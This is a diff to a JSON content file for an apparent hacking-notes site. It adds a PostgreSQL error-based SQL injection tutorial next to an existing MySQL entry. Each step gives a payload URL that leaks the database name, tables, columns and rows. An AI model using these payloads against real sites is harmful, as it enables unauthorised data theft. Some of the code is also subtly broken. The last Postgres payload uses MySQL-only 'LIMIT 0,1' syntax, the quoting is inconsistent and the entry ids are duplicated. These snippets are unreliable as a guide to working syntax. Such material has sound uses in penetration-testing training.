@@ -559,7 +559,7 @@
   {
     "id": 3,
     "slug": "mysql-error-based",
-    "title": "ERROR BASED SQLI",
+    "title": "ERROR BASED SQLI - MYSQL",
     "category": "notes",
     "blocks": [
       {
@@ -693,6 +693,122 @@
         "id": "checking-command",
         "language": "bash",
         "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,(SELECT username FROM article LIMIT 0,1),0x7e),1)"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "This is also pretty straight forward this will give you the row data"
+      }
+    ],
+    "youtubeUrl":"https://youtu.be/agSq415rFEs",
+    "goodbyeMessage":"Good luck, and happy hacking 🚀"
+  },
+  {
+    "id": 3,
+    "slug": "postgres-error-based",
+    "title": "ERROR BASED SQLI - POSTGRES",
+    "category": "notes",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "What is ERROR BASED SQLI injecton attack?"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "Error Based SQLI is a type of injection attack where we can get database content from errors, to test if a webApp is vulnerable or no we can run the following command."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=5' AND CAST((SELECT version()) AS int)-- -"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "If you use above command and if you get postgres syntax error then bingo there is ERROR BASED injection in the web app."
+      },
+
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "How to See the Database?"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "From its name it is quite obvious, we can see the content by triggering an error."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1 AND CAST((SELECT current_database()) AS int)-- -"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "By running above command you will see the database name as expected"
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Enumerate Tables"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "We have the database name so we will try to get the table names, you cannot get table names from basic sql syntax you need the below command to make it work."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1 AND CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "So from above command you can see the table names of the database."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Reading Columns"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "We have the table name, now we will ready it's column names, use the below command for that."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1' AND CAST((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)-- -"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "This is pretty straight forward this will give you the column name"
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Reading Rows"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "We have the column name, now we can read that column data, from here you have everything so you can use normal postgres query."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1 AND CAST((SELECT username FROM article LIMIT 0,1) AS int)-- -"
       },
       {
         "type": "paragraph",
